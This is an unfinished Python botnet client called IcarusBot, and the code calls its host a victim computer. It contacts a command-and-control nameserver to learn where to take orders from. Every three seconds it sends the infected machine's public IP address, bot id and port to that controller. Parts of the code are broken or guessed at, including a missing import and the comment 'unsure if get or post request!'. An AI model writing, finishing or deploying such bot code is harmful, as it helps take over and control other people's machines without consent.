# Keen to start
import requests
import socket, signal
import threading
import time
from config import API_URL

class IcarusBot():
    """
    A class used to represent the bot
    """
    def __init__(self):
        self.bot_id = 1 # should be random or grabbed somehow from victim computer
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)


    def exit_gracefully(self, signum, frame):
        print("\Exiting...")
        self.update_thread.cancel()
        sys.exit(0)

    def lookup(self):
        """sends request to nameserver to get command ip and port"""
        r = requests.get(f'{API_URL}/api/lookup/bot/{self.bot_id}')
        if (r.status_code == 200):
            self.command_ip, self.command_port =  r.text.split('::')
            print(self.command_ip)
            print(self.command_port)
    
    def update(self):
        """updates nameserver with ip and port"""
        self.update_thread = threading.Timer(3.0, self.update)
        self.update_thread.start()
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
        # setting up sockets required for port?
        payload = {'id':self.bot_id,'ip':ip,'port':25565}
        # unsure if get or post request!
        r = requests.post(f'{API_URL}/bot/update', data=payload)
        print('updating')

    def start(self):
        self.update()

def main():
    bot = IcarusBot()
    bot.start()

if __name__ == "__main__":
    main();